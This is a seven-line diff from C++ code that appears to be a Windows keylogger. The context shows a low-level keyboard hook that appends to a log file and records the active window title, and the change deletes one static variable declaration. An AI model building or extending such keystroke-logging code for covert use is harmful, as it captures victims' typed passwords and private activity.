@@ -108,7 +108,6 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
         std::ofstream myfile(location, std::ios::app | std::ios::binary);
         char name[MY_MAX_PATH] = {0};
         getActiveWindowTitle(name, MY_MAX_PATH);
-        static char last_name[MY_MAX_PATH] = {0};
         if (strncmp(name, last_name, MY_MAX_PATH) != 0)
         {
             strncpy(last_name, name, MY_MAX_PATH);
